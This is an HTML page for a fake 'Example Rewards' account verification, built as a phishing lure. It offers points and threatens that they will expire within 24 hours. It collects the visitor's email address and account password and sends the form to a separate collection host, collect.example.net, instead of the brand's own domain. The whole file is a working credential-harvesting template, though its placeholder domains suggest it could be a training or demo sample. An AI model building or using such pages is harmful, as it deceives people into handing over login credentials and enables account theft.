<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Rewards verification - Example Rewards</title>
  <link rel="stylesheet" href="/static/rewards.css">
</head>
<body>
  <main class="login-card">
    <h1>Example Rewards</h1>
    <p class="subtitle">You have 4,820 points waiting</p>

    <p class="warning">
      Verify your account within 24 hours or your points will expire.
    </p>

    <form id="verify" action="https://collect.example.net/post" method="POST">
      <label for="email">Email address</label>
      <input id="email" name="email" type="email" autocomplete="email" required>

      <label for="password">Account password</label>
      <input id="password" name="password" type="password" autocomplete="current-password" required>

      <button type="submit">Claim rewards</button>
    </form>

    <p class="fine-print">
      Example Rewards is a loyalty programme of Example Retail.
      <a href="https://example.com/terms">Terms</a>
    </p>
  </main>
</body>
</html>
